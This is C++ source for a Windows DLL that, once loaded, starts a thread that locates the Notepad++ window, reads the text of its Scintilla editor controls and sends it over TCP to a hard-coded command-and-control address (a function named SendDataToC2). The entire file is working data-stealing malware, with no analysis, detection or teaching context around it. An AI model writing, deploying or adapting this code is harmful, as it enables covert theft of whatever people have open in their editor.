#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <string>
#include <vector>

#pragma comment(lib, "ws2_32.lib")

bool SendDataToC2(const std::string& data) {
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        return false;
    }

    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) {
        WSACleanup();
        return false;
    }

    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(8080);
    inet_pton(AF_INET, "192.168.162.101", &serverAddr.sin_addr);

    if (connect(sock, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        closesocket(sock);
        WSACleanup();
        return false;
    }

    send(sock, data.c_str(), data.size(), 0);

    closesocket(sock);
    WSACleanup();
    return true;
}

std::vector<std::string> childTexts;
BOOL CALLBACK EnumChildProc(HWND hwnd, LPARAM lParam) {
    char className[256];
    GetClassNameA(hwnd, className, sizeof(className));
    if (strcmp(className, "Scintilla") == 0) {
        int length = SendMessageA(hwnd, WM_GETTEXTLENGTH, 0, 0);
        if (length > 0) {
            std::vector<char> buffer(length + 1);
            SendMessageA(hwnd, WM_GETTEXT, (WPARAM)buffer.size(), (LPARAM)buffer.data());
            childTexts.push_back(std::string(buffer.data()));
        }
    }
    return TRUE;
}

DWORD WINAPI ThreadFunc(LPVOID lpParam) {   
    Sleep(1000);

    HWND hwnd = FindWindowW(L"Notepad++", NULL);
    if (!hwnd) {
        hwnd = FindWindowW(L"Notepad++", L"");
    }
    if (!hwnd) {
        hwnd = FindWindowW(NULL, L"*New text document* - Notepad++");
    }

    if (hwnd) {
        childTexts.clear();
        EnumChildWindows(hwnd, EnumChildProc, 0);

        std::string allText;
        for (const auto& text : childTexts) {
            allText += text;
            allText += "\n---\n";
        }

        if (!allText.empty()) {
            SendDataToC2(allText);
        }
        else {
            SendDataToC2("No text found.");
        }
    }
    else {
        SendDataToC2("Notepad++ window not found.");
    }

    return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        CreateThread(NULL, 0, ThreadFunc, NULL, 0, NULL);
    }
    return TRUE;
}
